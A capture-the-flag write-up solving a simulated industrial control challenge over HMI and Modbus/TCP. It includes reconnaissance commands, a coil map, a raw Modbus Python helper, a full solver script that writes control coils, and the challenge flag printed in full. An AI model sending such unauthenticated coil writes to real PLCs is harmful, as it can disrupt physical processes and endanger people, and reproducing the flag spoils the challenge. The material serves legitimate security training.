# Ash-Vault Interlock Writeup
**Author:** Mohammed Ali  
**Difficulty:** hard 

## Challenge information

- Name: Ash-Vault Interlock
- Category: ICS / Modbus TCP / HMI
- HMI: `http://ip:port`
- Modbus/TCP: `ip:port`
- Flag:

```text
HTB{4sh_v4ult_1nt3rl0ck_s3aled_3726f03f5682ac89713783b598a33cae}
```

## Overview

The challenge simulates an industrial control environment consisting of an HMI and a PLC exposed through Modbus/TCP. The initial process state is unsafe:

- The system is in `AUTO` mode.
- Tank level `LT204` is at `100%`.
- Pressure `PT301` is above the permitted limit and the pressure-high latch is active.
- The auto-level signal is stuck at `12%`, so AUTO mode keeps the inlet valve open despite the full tank.

The objective is to stop the automatic cycle, switch to manual control, place the brine process inside the seal-ready operating window, and hold the seal command long enough to trigger the `AVX900` alarm containing the flag.

## HMI reconnaissance

Start by inspecting the HMI:

```bash
curl -i http://ip:port/
```

The page identifies the controller as:

```text
Asterion Controls AVX-470 Interlock PLC
```

The important JavaScript file is:

```bash
curl http://ip:port/static/hmi.js
```

It shows that process state is read from:

```text
/status.json
```

The endpoint returns compact arrays:

```javascript
raw.p = [
  level_percent,
  pressure_kpa,
  auto_level_raw_percent,
  feed_flow_lps,
  drain_flow_lps,
  vent_flow_kgph,
  recirc_flow_lps,
  motor_current_a,
  vibration_mm_s,
  temperature_c,
  surface_agitation
]

raw.o = [
  inlet_open,
  drain_open,
  vent_open,
  recirc_pump_running,
  seal_commanded
]

raw.s = [
  manual_active,
  pressure_hi_latch,
  reset_permissive,
  seal_stable_window,
  lt204_stuck_low,
  seal_token_alarm_active,
  bad_sequence_latch
]
```

Retrieve the current state with:

```bash
curl -s http://ip:port/status.json
```

The initial state was approximately:

```json
{
  "m": "AUTO",
  "p": [100.0, 76.6, 12.0, 6.4, 0.0, 0.0, 9.0, 21.0, 3.3, 38.6, 1.0],
  "o": [true, false, false, true, false],
  "s": [false, true, false, false, true, false, false],
  "a": [
    "PT301 pressure-high latch active",
    "LT204 vessel level high"
  ]
}
```

## Additional endpoint discovery

Simple path fuzzing reveals a useful file:

```text
/ladder.txt
```

Read it with:

```bash
curl -s http://ip:port/ladder.txt
```

This is a ladder export for:

```text
AVX47_ASH_VAULT_REV4_7
```

It confirms that the solution must satisfy the PLC interlocks rather than simply brute-forcing the seal command.

## Modbus map

Function code `1` reads coils and function code `2` reads discrete inputs.

Relevant discrete inputs:

```text
bit 0  = AUTO active
bit 1  = MANUAL active
bit 2  = inlet open
bit 3  = drain open
bit 4  = vent open
bit 5  = recirculation pump running
bit 6  = pressure-high latch
bit 7  = reset permissive
bit 8  = seal stable window
bit 9  = seal token alarm active
bit 10 = LT204 stuck low
bit 11 = bad sequence latch
```

Relevant command coils:

```text
coil 0 = AUTO command
coil 1 = MANUAL command
coil 2 = inlet valve command
coil 3 = drain valve command
coil 4 = vent valve command
coil 5 = recirculation pump command
coil 6 = reset-latch command
coil 7 = seal command
```

## Minimal Modbus/TCP helper

The following Python helper sends raw Modbus/TCP write-single-coil requests:

```python
import socket
import struct

HOST = "ip"
PORT = port
tid = 0

def mb(pdu):
    global tid
    tid += 1
    req = struct.pack(">HHHB", tid, 0, len(pdu) + 1, 1) + pdu
    with socket.create_connection((HOST, PORT), timeout=3) as s:
        s.sendall(req)
        return s.recv(4096)

def write_coil(addr, value):
    payload = 0xff00 if value else 0x0000
    pdu = bytes([5]) + struct.pack(">HH", addr, payload)
    return mb(pdu)
```

## Exploitation sequence

1. Switch to manual mode and close the inlet valve:

```python
write_coil(1, True)   # manual on
write_coil(0, False)  # auto off
write_coil(2, False)  # inlet closed
```

2. Open the drain and vent. The drain lowers the level while the vent relieves pressure:

```python
write_coil(3, True)   # drain open
write_coil(4, True)   # vent open
```

3. Close the vent after pressure has fallen:

```python
write_coil(4, False)
```

4. Wait until the level reaches the seal window, roughly `40–50%`, then close the drain:

```python
write_coil(3, False)
```

The stable values reached in the solved instance were approximately:

```text
level    = 46.5%
pressure = 32.0 kPa
```

5. Once `reset permissive` is active, pulse the latch-reset coil:

```python
write_coil(6, True)
write_coil(6, False)
```

6. Enable the seal command:

```python
write_coil(7, True)
```

After more than ten PLC scans, the `AVX900` alarm appears. Its updated text in `/status.json` contains the checkpoint token.

## Complete solver script

```python
import json
import socket
import struct
import time
import urllib.request

HOST = "ip"
MB_PORT = port
HMI = "http://ip:port/status.json"
tid = 100

def mb(pdu):
    global tid
    tid += 1
    req = struct.pack(">HHHB", tid, 0, len(pdu) + 1, 1) + pdu
    with socket.create_connection((HOST, MB_PORT), timeout=3) as s:
        s.sendall(req)
        return s.recv(4096)

def write_coil(addr, value):
    payload = 0xff00 if value else 0x0000
    mb(bytes([5]) + struct.pack(">HH", addr, payload))

def status():
    with urllib.request.urlopen(HMI, timeout=3) as response:
        return json.loads(response.read())

write_coil(1, True)    # manual on
write_coil(0, False)   # auto off
write_coil(2, False)   # inlet closed

write_coil(3, True)    # drain open
write_coil(4, True)    # vent open

# Close the vent after the pressure drops sufficiently.
while status()["p"][1] > 32:
    time.sleep(0.5)
write_coil(4, False)

# Keep draining until the level enters the stable seal window.
while status()["p"][0] > 48:
    time.sleep(0.5)
write_coil(3, False)

time.sleep(1)
write_coil(6, True)    # reset pressure latch
time.sleep(0.5)
write_coil(6, False)

write_coil(7, True)    # seal command

for _ in range(20):
    alarms = status()["a"]
    print(alarms)
    if any("HTB{" in alarm for alarm in alarms):
        break
    time.sleep(1)
```

## Result

The final alarm is:

```text
AVX900 ASH-VAULT SEAL MADE - TOKEN HTB{4sh_v4ult_1nt3rl0ck_s3aled_3726f03f5682ac89713783b598a33cae}
```

Flag:

```text
HTB{4sh_v4ult_1nt3rl0ck_s3aled_3726f03f5682ac89713783b598a33cae}
```

### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon

